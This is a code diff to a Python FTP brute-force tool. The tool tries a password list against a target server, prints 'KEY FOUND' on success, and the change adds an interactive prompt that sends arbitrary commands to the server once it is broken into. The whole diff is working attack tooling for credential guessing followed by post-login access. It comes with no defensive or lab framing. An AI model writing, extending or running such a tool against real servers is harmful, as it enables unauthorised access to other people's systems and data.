@@ -22,6 +22,7 @@ def ftp_bruteforce(username, password_list, target, port):
             ftp.connect(target, port, timeout=5)
             ftp.login(username, password)
             print(Fore.GREEN + f"KEY FOUND: [ \"{password}\" ]")
+            interactive_ftp(ftp)  # Call the function to interact with the FTP server
             ftp.quit()
             return
         except ftplib.error_perm:
@@ -31,6 +32,28 @@ def ftp_bruteforce(username, password_list, target, port):
             return
 
     print(Fore.RED + "KEY NOT FOUND")
+
+def interactive_ftp(ftp):
+    print(Fore.CYAN + "[*] Successfully logged in! You can now execute FTP commands.")
+    print(Fore.CYAN + "[*] Type 'exit' to logout.")
+
+    while True:
+        command = input(Fore.YELLOW + "ftp> ")
+
+        if command.lower() == "exit":
+            print(Fore.CYAN + "[*] Logging out.")
+            break
+
+        try:
+            # Send the command to the FTP server
+            response = ftp.sendcmd(command)
+            print(Fore.GREEN + response)
+        except ftplib.error_perm as e:
+            print(Fore.RED + f"[!] Permission Error: {e}")
+        except ftplib.error_temp as e:
+            print(Fore.RED + f"[!] Temporary Error: {e}")
+        except Exception as e:
+            print(Fore.RED + f"[!] Error: {e}")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="FTP Bruteforcer")
